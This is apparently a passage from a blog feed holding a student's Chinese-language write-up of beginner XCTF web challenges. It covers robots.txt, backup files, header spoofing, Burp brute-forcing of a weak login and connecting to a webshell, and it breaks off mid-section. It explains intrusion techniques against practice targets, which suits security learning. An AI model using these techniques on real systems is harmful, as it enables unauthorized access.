&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    while(getchar()!=&amp;#39;\n&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        continue;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>攻防世界web新手区做题记录</title>
        <link>https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
        <pubDate>Tue, 05 Nov 2019 14:08:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;学校信安协会第一次培训结束后的作业，要求把攻防世界的web新手区题目做一遍并写题解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第一题-view_source&#34;&gt;第一题 view_source
&lt;/h3&gt;&lt;p&gt;查看源代码右键不能用，但是F12能用，于是找到源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/950.png&#34;
	width=&#34;1920&#34;
	height=&#34;911&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/950_hu1116533409794634477.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/950_hu7494912621572478381.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;210&#34;
		data-flex-basis=&#34;505px&#34;
	
&gt;
输入到flag框即可&lt;/p&gt;
&lt;p&gt;后来在网上看到可以在url前面插入view-source:来查看网页源代码&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第二题-get_post&#34;&gt;第二题 get_post
&lt;/h3&gt;&lt;p&gt;题目描述点明了该题要用到关于http的两种请求方式，那么就要学习一下http的几种请求方式。&lt;/p&gt;
&lt;p&gt;查阅各种博客之后，发现get的请求方式直接在url框内输入就好，而post的请求方式需要用其他方式写入参数，有点高深。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/953.png&#34;
	width=&#34;1920&#34;
	height=&#34;904&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/953_hu17959037500384476257.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/953_hu12562770917989881961.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;212&#34;
		data-flex-basis=&#34;509px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;找到了火狐的harkbar工具包插件，学习了一下参数注入，成功过关。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/952.png&#34;
	width=&#34;1920&#34;
	height=&#34;897&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/952_hu17228927733953822422.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/952_hu17367855579187026260.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;214&#34;
		data-flex-basis=&#34;513px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第三题-robots&#34;&gt;第三题 robots
&lt;/h3&gt;&lt;p&gt;看到了新名词，自然要去学习这个什么robots协议，查阅资料后发现就是爬虫协议，也叫机器人协议蜘蛛协议什么的。&lt;/p&gt;
&lt;p&gt;从博客学习：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_40491569/article/details/83473703&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;robots协议文件的写法及语法属性解释&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    robots.txt文件是一个文本文件，是放置在网站根目录下，使用任何一个常见的文本编辑器，就可以创建和编辑它。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，其主要的作用就是告诉蜘蛛程序在服务器上什么文件是可以被查看的。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1003.png&#34;
	width=&#34;312&#34;
	height=&#34;41&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1003_hu2756507665033515980.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1003_hu16135084978002088502.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;760&#34;
		data-flex-basis=&#34;1826px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在后面加上robots.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1002.png&#34;
	width=&#34;787&#34;
	height=&#34;179&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1002_hu8265441545462913290.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1002_hu7089480937914314964.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;439&#34;
		data-flex-basis=&#34;1055px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;出现个.php的disallow，把它放到url后面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1001.png&#34;
	width=&#34;751&#34;
	height=&#34;173&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1001_hu17605638655296413117.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1001_hu16235625532623039611.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;434&#34;
		data-flex-basis=&#34;1041px&#34;
	
&gt;
输入flag，下一题。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第四题-backup&#34;&gt;第四题 backup
&lt;/h3&gt;&lt;p&gt;涉及到备份的问题了，继续学习。发现备份的后缀是.bak，backup的缩写。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1023.png&#34;
	width=&#34;475&#34;
	height=&#34;158&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1023_hu14453943655321302556.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1023_hu8737633789192950095.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;300&#34;
		data-flex-basis=&#34;721px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在url框输入index.php.bak
&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1022.png&#34;
	width=&#34;542&#34;
	height=&#34;387&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1022_hu13076681908433564792.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1022_hu8872518069898803485.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;140&#34;
		data-flex-basis=&#34;336px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1021.png&#34;
	width=&#34;1059&#34;
	height=&#34;745&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1021_hu8475316471798570471.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1021_hu763392180693773559.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;142&#34;
		data-flex-basis=&#34;341px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第五题-cookie&#34;&gt;第五题 cookie
&lt;/h3&gt;&lt;p&gt;f12找cookie，找到一个php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1019.png&#34;
	width=&#34;1920&#34;
	height=&#34;988&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1019_hu12266357567563050274.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1019_hu17783725962026119694.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;466px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入php，发现需要查看http response，费老大劲找响应头：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1020.png&#34;
	width=&#34;1920&#34;
	height=&#34;987&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1020_hu9641586235304646256.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1020_hu13366106688606508827.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;466px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第六题-disable_button&#34;&gt;第六题 disable_button
&lt;/h3&gt;&lt;p&gt;打开链接发现一个不能按的按钮框，老办法，f12&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1047.png&#34;
	width=&#34;349&#34;
	height=&#34;181&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1047_hu5587443402045131740.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1047_hu3520806044720933285.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;462px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;把disabled的内容删去，把按钮变为可按状态。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1048.png&#34;
	width=&#34;1920&#34;
	height=&#34;909&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1048_hu143094694876559651.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1048_hu17107826091477472643.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;按下按钮之后，得到flag&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第七题&#34;&gt;第七题
&lt;/h3&gt;&lt;p&gt;看到js的样式，直觉到与javascript有关。打开网页发现要输密码，啥也没想点了个确认发现换了网页，查看原代码之后发现了这个&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1078.png&#34;
	width=&#34;1920&#34;
	height=&#34;318&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1078_hu11042138577310825762.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1078_hu13618624937401692954.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;603&#34;
		data-flex-basis=&#34;1449px&#34;
	
&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;```
dechiffre(&amp;quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&amp;quot;)
```
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;\x在c语言中是十六进制，于是转换成十进制，再用acsii码对比一下。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第八题-xff_referer&#34;&gt;第八题 xff_referer
&lt;/h3&gt;&lt;p&gt;得，没见过的东西，再去继续学习。&lt;/p&gt;
&lt;p&gt;X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。&lt;/p&gt;
&lt;p&gt;HTTP Referer：header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。&lt;/p&gt;
&lt;p&gt;要伪造ip地址，网上查阅一下火狐浏览器可以用插件，装上之后伪造ip。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1113.png&#34;
	width=&#34;301&#34;
	height=&#34;69&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1113_hu9248057496866612320.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1113_hu6685136234815015325.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;436&#34;
		data-flex-basis=&#34;1046px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;学习一下burp的基本操作：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1101.png&#34;
	width=&#34;1234&#34;
	height=&#34;992&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1101_hu13874152862557346344.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1101_hu17319568443912960813.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;124&#34;
		data-flex-basis=&#34;298px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看到一个google&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1100.png&#34;
	width=&#34;1234&#34;
	height=&#34;992&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1100_hu5994699215294247710.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1100_hu1664177013913865500.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;124&#34;
		data-flex-basis=&#34;298px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第九题-weak-auth&#34;&gt;第九题 weak auth
&lt;/h3&gt;&lt;p&gt;上来就让输入信息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1112.png&#34;
	width=&#34;475&#34;
	height=&#34;461&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1112_hu7966985037435964792.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1112_hu5498754507237343624.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;103&#34;
		data-flex-basis=&#34;247px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;学习一下burp的爆破操作，网上找些字典，把用户名跟密码输入：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1104.png&#34;
	width=&#34;1051&#34;
	height=&#34;667&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1104_hu16178329874309761875.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1104_hu2084624801738563828.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;378px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1110.png&#34;
	width=&#34;440&#34;
	height=&#34;35&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1110_hu12706008985291526260.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1110_hu10571854621088404743.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1257&#34;
		data-flex-basis=&#34;3017px&#34;
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;第十题-webshell&#34;&gt;第十题 webshell
&lt;/h3&gt;&lt;p&gt;为了连接webshell专门搞个antsword&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1109.png&#34;
	width=&#34;369&#34;
	height=&#34;149&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1109_hu4818768236256360496.png 480w, https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1109_hu17781426198587316773.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;247&#34;
		data-flex-basis=&#34;594px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;说实话我一开始不知道这个连接密码是啥，上网查了查：&lt;/p&gt;
